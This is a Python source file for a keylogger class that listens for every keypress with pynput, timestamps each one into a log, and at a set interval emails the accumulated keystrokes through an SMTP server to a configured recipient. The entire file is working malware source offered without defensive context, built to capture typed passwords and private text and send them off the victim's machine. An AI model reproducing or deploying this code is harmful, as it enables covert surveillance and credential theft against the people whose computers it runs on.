#!/usr/bin/env python
from pynput.keyboard import Key, Listener
from smtplib import SMTP
from email.mime.text import MIMEText
import time
import colors


class Keylogger(object):

    def __init__(self, interval, sender, destination, host, port, username,
                 password):
        self.interval = interval
        self.sender = sender
        self.destination = destination
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.log = ""

    def send_email(self):
        if self.t1+float(self.interval) <= time.time():
            msg = MIMEText(self.log, "plain")
            msg["Subject"] = "Keylogger Log: {}-{}"\
                             .format(time.ctime(self.t1),
                                     time.ctime(time.time()))
            msg["From"] = self.sender
            msg["To"] = self.destination

            conn = SMTP(host=self.host, port=self.port)
            conn.starttls()
            conn.login(self.username, self.password)
            try:
                conn.sendmail(self.sender, self.destination,
                              msg.as_string())
            finally:
                conn.quit()

            self.log = ""
            self.t1 = time.time()

    def log_keypress(self, Key):
        self.log += time.ctime() + ": " + str(Key) + "\n"
        self.send_email()

    def start_keylogger(self):
        try:
            self.t1 = time.time()

            colors.info("Capturing keystrokes...")

            with Listener(on_press=self.log_keypress) as listener:
                listener.join()

        except KeyboardInterrupt:
            colors.success('Stopping keylogger...')
